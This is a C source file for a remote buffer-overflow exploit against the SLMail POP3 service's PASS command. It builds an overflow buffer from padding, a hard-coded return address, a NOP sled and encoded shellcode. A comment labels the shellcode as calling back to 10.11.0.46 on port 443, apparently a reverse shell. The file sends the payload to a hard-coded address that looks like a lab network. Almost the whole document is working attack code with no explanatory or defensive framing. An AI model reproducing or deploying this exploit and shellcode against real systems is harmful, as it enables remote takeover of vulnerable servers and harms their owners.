#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h> 
#include <arpa/inet.h>

#define retadd "\x8f\x35\x4a\x5f" 
#define port 110

/* Host: 10.11.0.46; Port:443; thread safe; 351 bytes*/
char shellcode[] =
"\xda\xd4\xd9\x74\x24\xf4\xba\x9a\xb6\xbf\xb0\x5e\x31\xc9\xb1"
"\x52\x83\xee\xfc\x31\x56\x13\x03\xcc\xa5\x5d\x45\x0c\x21\x23"
"\xa6\xec\xb2\x44\x2e\x09\x83\x44\x54\x5a\xb4\x74\x1e\x0e\x39"
"\xfe\x72\xba\xca\x72\x5b\xcd\x7b\x38\xbd\xe0\x7c\x11\xfd\x63"
"\xff\x68\xd2\x43\x3e\xa3\x27\x82\x07\xde\xca\xd6\xd0\x94\x79"
"\xc6\x55\xe0\x41\x6d\x25\xe4\xc1\x92\xfe\x07\xe3\x05\x74\x5e"
"\x23\xa4\x59\xea\x6a\xbe\xbe\xd7\x25\x35\x74\xa3\xb7\x9f\x44"
"\x4c\x1b\xde\x68\xbf\x65\x27\x4e\x20\x10\x51\xac\xdd\x23\xa6"
"\xce\x39\xa1\x3c\x68\xc9\x11\x98\x88\x1e\xc7\x6b\x86\xeb\x83"
"\x33\x8b\xea\x40\x48\xb7\x67\x67\x9e\x31\x33\x4c\x3a\x19\xe7"
"\xed\x1b\xc7\x46\x11\x7b\xa8\x37\xb7\xf0\x45\x23\xca\x5b\x02"
"\x80\xe7\x63\xd2\x8e\x70\x10\xe0\x11\x2b\xbe\x48\xd9\xf5\x39"
"\xae\xf0\x42\xd5\x51\xfb\xb2\xfc\x95\xaf\xe2\x96\x3c\xd0\x68"
"\x66\xc0\x05\x3e\x36\x6e\xf6\xff\xe6\xce\xa6\x97\xec\xc0\x99"
"\x88\x0f\x0b\xb2\x23\xea\xdc\xb7\xb8\xf4\x32\xa0\xbc\xf4\x4b"
"\x8b\x48\x12\x21\xfb\x1c\x8d\xde\x62\x05\x45\x7e\x6a\x93\x20"
"\x40\xe0\x10\xd5\x0f\x01\x5c\xc5\xf8\xe1\x2b\xb7\xaf\xfe\x81"
"\xdf\x2c\x6c\x4e\x1f\x3a\x8d\xd9\x48\x6b\x63\x10\x1c\x81\xda"
"\x8a\x02\x58\xba\xf5\x86\x87\x7f\xfb\x07\x45\x3b\xdf\x17\x93"
"\xc4\x5b\x43\x4b\x93\x35\x3d\x2d\x4d\xf4\x97\xe7\x22\x5e\x7f"
"\x71\x09\x61\xf9\x7e\x44\x17\xe5\xcf\x31\x6e\x1a\xff\xd5\x66"
"\x63\x1d\x46\x88\xbe\xa5\x66\x6b\x6a\xd0\x0e\x32\xff\x59\x53"
"\xc5\x2a\x9d\x6a\x46\xde\x5e\x89\x56\xab\x5b\xd5\xd0\x40\x16"
"\x46\xb5\x66\x85\x67\x9c";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2975);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 13);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.10.130");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
